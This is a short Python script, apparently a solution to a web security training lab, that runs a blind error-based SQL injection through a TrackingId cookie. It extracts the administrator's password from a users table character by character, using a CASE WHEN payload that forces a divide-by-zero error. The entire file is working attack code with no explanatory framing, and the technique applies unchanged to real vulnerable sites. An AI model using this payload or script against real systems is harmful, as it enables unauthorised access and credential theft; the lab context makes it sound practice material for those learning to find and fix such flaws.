import requests
import sys

url = "https://0a0c0026044c266c86759da9006f00fd.web-security-academy.net/"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

i=1
while(True):
    for c in chars:
        payload = f"aasdf' UNION SELECT CASE WHEN (username='administrator' and '{c}'=substr(password, {i}, 1) ) THEN TO_CHAR(1/0) ELSE NULL END FROM users-- -" 
        cookies = {"TrackingId":payload}
        r = requests.get(url, cookies=cookies).text
        if("Internal Server Error" in r):
            sys.stdout.write(c)
            sys.stdout.flush()
            i += 1
            break

